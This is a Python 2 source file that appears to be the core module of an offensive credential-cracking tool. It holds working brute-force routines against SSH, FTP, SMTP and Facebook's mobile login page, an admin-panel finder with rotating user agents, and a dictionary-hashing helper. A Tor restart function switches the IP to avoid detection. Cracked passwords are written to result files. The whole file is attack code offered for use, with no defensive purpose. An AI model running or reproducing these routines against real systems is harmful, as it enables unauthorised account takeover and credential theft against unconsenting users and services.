#!/usr/bin/env python

from time import sleep
from pexpect import pxssh
from sys import stdout
from hashlib import new
from mechanize import Browser
from ftplib import FTP
from smtplib import SMTP
from urllib2 import Request, urlopen
from os import geteuid, system
from subprocess import Popen
import socks, socket, random


class colors:
        def __init__(self):
                self.blue = "\033[94m"
                self.red = "\033[91m"
                self.bold = "\033[1m"
                self.end = "\033[0m"
cl = colors()


useragents = ['Mozilla/5.0 (Android 7.5.9; Mobile; rv:60.0) Gecko/60.0 Firefox/60.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0.1',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
'Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0',
'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0'
]


def write(name, word):
    with open("Results/"+name, 'a') as fl:
        fl.write(str(word+'\n'))
        fl.close()


def upip():
    cmd = ['service','tor','restart']
    Popen(cmd).wait()
    sleep(5)
    socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
    socket.socket = socks.socksocket



def getproxy():
    result = urlopen("http://icanhazip.com/").read() #https://api.ipify.org/?format=json

    msg = "[+]Update | New IP: "+str(result)
    return msg



def sshcracker(host, user, password, count):
    try:
        stdout.write("[%s] Testing: %s" %(count, password)+ "                                       \r")
        stdout.flush()
        s = pxssh.pxssh()
        s.login(host, user, password)
        print cl.red+("\n\n[+] Password Found: [ {} ] ".format(password))+cl.end
        print ("\n[To Connect With SSH Service Write] : ssh {}@{}".format(user,host))
        print "[Then Enter Password]: ",password
        print "\n\t* Done *\n"
        word = str("Host: %s | User: %s | Password: %s" %(host, user, password))
        write('sshcracker', word)
        exit(0)
    except Exception:
        return None 



def ftpcracker(host, user, password, count):
    try:
        stdout.write("[%s] Testing: %s" %(count, password)+ "                                         \r")
        stdout.flush()
        ftp = FTP(host)
        ftp.login(user, password)
        print(cl.red+"\nLogin successfuly with password: "+str(password)+cl.end+'\n')
        ftp.quit()
        word = str('Host: %s | User: %s | Password: %s' %(host, user, password))
        write("ftpcracker", word)
        exit(0)
    except Exception:
        return False



def adminfinder(link, count):
    try:
        stdout.write("[%s] Testing: %s" %(count, link)+ "                                             \r")
        stdout.flush()
        usragent = random.choice(useragents)
        url = Request(link, headers={'User-Agent': usragent})
        open_url = urlopen(url)
        print (cl.red+"\n\n[+] Link Found: {}\n\n".format(link)+cl.end)
        word = str(link)
        write("AdminFinder", word)
        sleep(0.5)
    except Exception:
        pass



def hashing(word, algorithm, count):
    """ algorithms available: ['md4', 'md5', 'sha1', 'sha256' .... etc] """
    stdout.write("[%s] Testing: %s" %(count, word)+ "                       \r")
    stdout.flush()
    hash_type = new(algorithm)
    hash_type.update(word)
    return hash_type.hexdigest()



def fblogin(user, passwd, count):
    stdout.write("[%s] Testing: %s" %(count, passwd)+ "                                     \r")
    stdout.flush()
    br = Browser()
    br.set_handle_robots(False)

    br.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]
    
    url = "https://mobile.facebook.com/login.php"
    sign_in = br.open(url)  

    br.select_form(nr = 0)

    br["email"] = user

    br["pass"] = passwd    

    br.submit()   

    check = br.geturl()
    if "email" in check:
        pass

    else:
        print(cl.red+"login successfuly with user [{}] and password [{}]".format(user,passwd)+cl.end)
        exit(0)


#next version

#def twitter(user, password, count):

#next version

#def gmail():



def sMtp(host, user, password, count):
    stdout.write("[%s] Testing: %s" %(count, password)+"                                     \r")
    stdout.flush()
    s = SMTP(host, '25')
    try:
        s.ehlo()
        s.starttls()
        s.ehlo
        s.login(str(user), str(password))
        print("[*] Username: %s | [*] Password found: %s\n" % (user, password))
        s.close()
        exit(0)
    except Exception:
        return False